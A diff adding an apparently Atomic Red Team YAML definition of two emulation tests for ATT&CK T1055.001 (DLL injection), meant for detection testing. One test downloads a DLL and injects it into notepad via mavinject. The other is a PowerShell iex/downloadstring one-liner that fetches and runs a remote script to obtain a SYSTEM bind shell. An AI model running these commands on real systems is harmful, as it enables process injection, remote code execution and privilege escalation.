@@ -1,0 +1,46 @@
+attack_technique: T1055.001
+display_name: 'Process Injection: Dynamic-link Library Injection'
+atomic_tests:
+- name: Process Injection via mavinject.exe
+  auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+  description: |
+    Windows 10 Utility To Inject DLLS.
+
+    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+    With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+  supported_platforms:
+  - windows
+  input_arguments:
+    process_id:
+      description: PID of input_arguments
+      type: string
+      default: (Start-Process notepad -PassThru).id
+    dll_payload:
+      description: DLL to Inject
+      type: path
+      default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Utility to inject must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+  executor:
+    command: |
+      $mypid = #{process_id}
+      mavinject $mypid /INJECTRUNNING "#{dll_payload}"
+      Stop-Process -processname notepad
+    name: powershell
+    elevation_required: true
+- name: WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique
+  auto_generated_guid: 8b56f787-73d9-4f1d-87e8-d07e89cbc7f5
+  description: Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
+    name: powershell
